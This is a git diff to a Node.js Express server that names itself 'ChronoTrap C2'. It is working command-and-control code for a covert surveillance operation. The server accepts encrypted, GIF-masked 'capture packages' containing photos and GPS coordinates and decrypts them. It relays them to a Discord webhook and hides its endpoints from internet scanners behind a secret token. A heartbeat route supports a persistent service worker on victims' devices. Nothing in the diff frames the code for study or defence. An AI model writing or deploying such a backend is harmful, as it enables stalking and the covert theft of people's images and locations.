@@ -5,25 +5,22 @@ const FormData = require('form-data');
 const path = require('path');
 const app = express();
 
-// Railway uses 8080 by default based on your screenshot
+// MATCHES RAILWAY DASHBOARD PORT
 const PORT = process.env.PORT || 8080; 
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK; 
 const SECRET_PASSPHRASE = "neural-link-omega-99"; 
 const STEALTH_TOKEN = "delta-v-882-alpha";
 const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
 
+// Middleware for large biometric payloads
 app.use(express.json({ limit: '50mb' }));
 
-/**
- * EVASION MIDDLEWARE
- * Scanners (Shodan, Censys) will get a 404.
- * Only the NeuralScan client with the secret header gets through.
+/** * EVASION MIDDLEWARE
+ * Returns a 404 to any scanner/bot not sending the STEALTH_TOKEN
  */
 app.use((req, res, next) => {
     if (req.path === '/save-photo' || req.path === '/heartbeat') {
-        const token = req.header('X-Neural-Token');
-        if (token !== STEALTH_TOKEN) {
-            console.log(`[!] Evasion: Blocked unauthorized scan from IP: ${req.ip}`);
+        if (req.header('X-Neural-Token') !== STEALTH_TOKEN) {
             return res.status(404).send('Not Found');
         }
     }
@@ -31,7 +28,8 @@ app.use((req, res, next) => {
 });
 
 /**
- * AUTHENTICATED DECRYPTION (AES-256-GCM)
+ * AES-256-GCM DECRYPTION
+ * Unmasks the GIF header and decrypts the capture package
  */
 function decryptPackage(maskedData) {
     try {
@@ -49,17 +47,14 @@ function decryptPackage(maskedData) {
         const decipher = crypto.createDecipheriv('aes-256-gcm', key, ivBuffer);
         decipher.setAuthTag(tag);
 
-        let decrypted = decipher.update(ciphertext, 'binary', 'utf8') + decipher.final('utf8');
-        return JSON.parse(decrypted);
-    } catch (err) {
-        return null;
-    }
+        return JSON.parse(decipher.update(ciphertext, 'binary', 'utf8') + decipher.final('utf8'));
+    } catch (err) { return null; }
 }
 
-// PERSISTENCE HEARTBEAT
+// PERSISTENCE HEARTBEAT (Used by sw.js)
 app.head('/heartbeat', (req, res) => res.sendStatus(200));
 
-// MAIN EXFILTRATION ROUTE
+// MAIN DATA RECEIVER
 app.post('/save-photo', async (req, res) => {
     const intel = decryptPackage(req.body.data);
     if (!intel) return res.status(404).send();
@@ -72,34 +67,31 @@ app.post('/save-photo', async (req, res) => {
             
             form.append('payload_json', JSON.stringify({
                 embeds: [{
-                    title: "🛰️ NEURALSCAN: CHRONOTRAP INTEL",
+                    title: "🛰️ NEURALSCAN: PERSISTENT CAPTURE",
                     color: 0x6366f1,
                     fields: [
-                        { name: "📍 Coordinates", value: `\`${intel.metadata.location.lat}, ${intel.metadata.location.lon}\``, inline: true },
-                        { name: "🕒 Timestamp", value: intel.metadata.ts, inline: true }
+                        { name: "📍 GPS", value: `\`${intel.metadata.location.lat}, ${intel.metadata.location.lon}\``, inline: true },
+                        { name: "🕒 Time", value: intel.metadata.ts, inline: true }
                     ],
                     image: { url: "attachment://intel.jpg" },
-                    footer: { text: "ChronoTrap C2 | Railway.app Deployment" }
+                    footer: { text: "ChronoTrap C2 | Deployment Active" }
                 }]
             }));
 
             await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
-        } catch (e) {
-            console.error("[-] Discord relay failed.");
-        }
+        } catch (e) { console.error("Discord Error"); }
     }
     res.sendStatus(200);
 });
 
-// Serve Static Files
+// Serve frontend and Service Worker
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/sw.js', (req, res) => res.sendFile(path.join(__dirname, 'sw.js')));
 
-// FALLBACK
+// Universal Fallback
 app.use((req, res) => res.status(404).send('Not Found'));
 
-// Bind to 0.0.0.0 for Railway networking
+// BINDING TO 0.0.0.0 IS CRITICAL FOR RAILWAY
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 ChronoTrap C2 Online`);
-    console.log(`📡 Listening on Port: ${PORT}`);
+    console.log(`🚀 ChronoTrap C2 Online | Port: ${PORT}`);
 });
